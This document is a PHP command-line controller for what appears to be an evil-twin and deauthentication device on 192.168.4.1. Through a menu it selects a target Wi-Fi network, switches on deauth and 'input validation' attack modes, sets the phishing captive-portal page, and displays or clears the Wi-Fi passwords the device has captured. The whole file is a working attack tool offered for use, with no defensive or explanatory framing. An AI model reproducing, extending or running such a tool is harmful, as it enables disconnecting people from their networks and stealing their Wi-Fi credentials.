<?php
error_reporting(0);
function curl($url, $ua, $data= null){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_COOKIEJAR, 'att.txt');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $ua);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
/**	curl_setopt($ch, CURLOPT_VERBOSE, 1);**/
	$result = curl_exec($ch);
	return $result;
}
 function get($url){
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, 'att.txt');
	$result = curl_exec($ch);
	return $result;
}
$ua = array(
"Host: 192.168.4.1",
"Connection: keep-alive",
"Cache-Control: max-age=0",
"Upgrade-Insecure-Requests: 1",
"Save-Data: on",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"Referer: http://192.168.4.1/login",
"Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
  );
 $bar = "
╭━━━┳━━━━┳━━━━╮╱╭━━━┳╮╱╱╭━━╮
┃╭━╮┃╭╮╭╮┃╭╮╭╮┃╱┃╭━╮┃┃╱╱╰┫┣╯
┃┃╱┃┣╯┃┃╰┻╯┃┃╰╯╱┃┃╱╰┫┃╱╱╱┃┃
┃╰━╯┃╱┃┃╱╱╱┃┃╭━━┫┃╱╭┫┃╱╭╮┃┃
┃╭━╮┃╱┃┃╱╱╱┃┃╰━━┫╰━╯┃╰━╯┣┫┣╮
╰╯╱╰╯╱╰╯╱╱╱╰╯╱╱╱╰━━━┻━━━┻━━╯ By Febryan\n\n";
print $bar;
print "Please Login...\n[>] Password: ";
$pass = trim(fgets(STDIN));

$data = "strWebUsername=razor&PASSWORD=$pass&SUBMIT=Submit";
$login = curl("http://192.168.4.1/login", $ua, $data);

$beranda = explode('o_deauth', $login);
$log = $beranda[1];
if(isset($log)){
print "[*] SUCCESS LOGIN\n";
sleep(5);
menu:
system('clear');
print $bar;
$tmenu= get('http://192.168.4.1/setup');
$targe = explode('/survey>', $tmenu);
$targe = explode('</a>', $targe[1]);
$target = $targe[0];
print "TARGET: [$target]\n\nMENU:\n[1] SELECT TARGET\n[2] MODE SETTINGS\n[3] FILE MANAGER\n[4] LIST PASSWORDS\n[5] STATUS\n[6] REBOOT\n[7] RESET\n[8] START\n\n[>]Select: ";
$menu = trim(fgets(STDIN));
if($menu == 1){
  goto select;
}
if($menu == 2){
  goto option;
}
if($menu == 3){
  goto fm;
}
if($menu == 4){
  goto pass;
}
if($menu == 5){
  goto status;
}
if($menu == 6){
$rebot = get('http://192.168.4.1/reboot');
  goto menu;
}
if($menu == 7){
  $reset = get('http://192.168.4.1/reset');
  goto menu;
}
if($menu ==  8){
  print "[*] TARGET: $target\n";
  print '["PLEASE TURN OFF YOU WIFI TO START ATTACK & BACK AGAIN"]';
  sleep("15");
  goto menu;
}
goto menu;
status:
system("clear");
print $bar;
$sts = get('http://192.168.4.1/status');
print $sts;
print "\n\n[5]BACK MENU\n\n[>]Select: ";
$stat = trim(fgets(STDIN));
if($stat == 5){
  goto menu;
}else{
  goto menu;
}
select:
system("clear");
print $bar;
print "[*] BSSID&SSID List:\n\n";
$survey = get('http://192.168.4.1/survey');
  for($a=0; $a<10; $a++){
  $list = explode('?', $survey);
  $list = explode('>', $list[$a]);
  $h = $list[0];
  if($h == ""){
    
  }else{
    print "[$a] $h\n";
     $save = fopen('ssid.txt', "a");
    fputs($save, "$h\n");
    fclose($save);
  }
}
$file = file_get_contents("ssid.txt");
$bom = explode("\n",$file);
print "\n[0]BACK MENU \n";
print "\n[>]Select: ";
$selet = trim(fgets(STDIN));
if($selet == 0){
  goto menu;
}
$set = $bom[$selet];
$gas = get("http://192.168.4.1/settarget?$set");
$save = fopen('ssid.txt', "w");
    fputs($save, "");
    fclose($save);
goto menu;
fm:
system("clear");
print $bar;
print "[*] File Manager\n\n";
$save2 = fopen('fm.txt', "a");
    fputs($save2, "\n");
    fclose($save2);
for($a=1; $a<3; $a++){
$fm = get("http://192.168.4.1/fm");
$fil = explode('href=http://192.168.4.1/', $fm);
$fil = explode('>', $fil[$a]);
  $f = $fil[0];
if($f == ""){
     
   }else{
     print "[$a] $f\n";
     $save2 = fopen('fm.txt', "a");
    fputs($save2, "$f\n");
    fclose($save2);
   }
}
$file2 = file_get_contents("fm.txt");
$bom2 = explode("\n",$file2);
print "\n\n[0]BACK MENU\n[>]Select: ";
$fmi = trim(fgets(STDIN));
$fmh = $bom2[$fmi];
if($fmi == 0){
  goto menu;
}
$setfw = get("http://192.168.4.1/fm?action=setpage&file=/$fmh");
$save2 = fopen('fm.txt', "w");
    fputs($save2, "\n");
    fclose($save2);
goto menu;
option:
system("clear");
print $bar;
$getmenu= get('http://192.168.4.1/setup');
$obot = explode('o_autoreboot>', $getmenu);
$obot = explode('</a>', $obot[1]);
$getd = explode('o_deauth>', $getmenu);
$getd = explode('</a>', $getd[1]);
$getv = explode('o_inputvalid>', $getmenu);
$getv = explode('</a>', $getv[1]);
$deauth = $getd[0];
$inputv = $getv[0];
$autor = $obot[0];

print "\nWifi Target: [$target]\n\nAttack Mode\n[1]Deauth [$deauth]\n[2]Input Validation[$inputv]\n[3]Auto Reboot [$autor]\n\n[4]BACK MENU\n[>]Select: ";
$mode = trim(fgets(STDIN));
if($mode == 1){
$getdeauth = get('http://192.168.4.1/o_deauth');
  system('clear');
  goto option;
}
if($mode == 2){
    $getinput= get('http://192.168.4.1/o_inputvalid');
     system('clear');
     goto option;
}
if($mode == 3){
$getautor = get('http://192.168.4.1/o_autoreboot');
  system('clear');
  goto option;
}
if($mode == 4){
  goto menu;
}
goto menu;
pass:
system('clear');
print $bar;
$info = get('http://192.168.4.1/password.txt');
print "Password:\n$info\n";
print "[4]CLEAR PASSWORDS\n[5]BACK MENU\n\n[>]Select: ";
$ps = trim(fgets(STDIN));
if($ps == 5){
  goto menu;
}
if($ps == 4){
  $delet = get('192.168.4.1/clear_passwords');
  goto pass;
}
}else{
  print "Password Wrong\n";
} 
?>
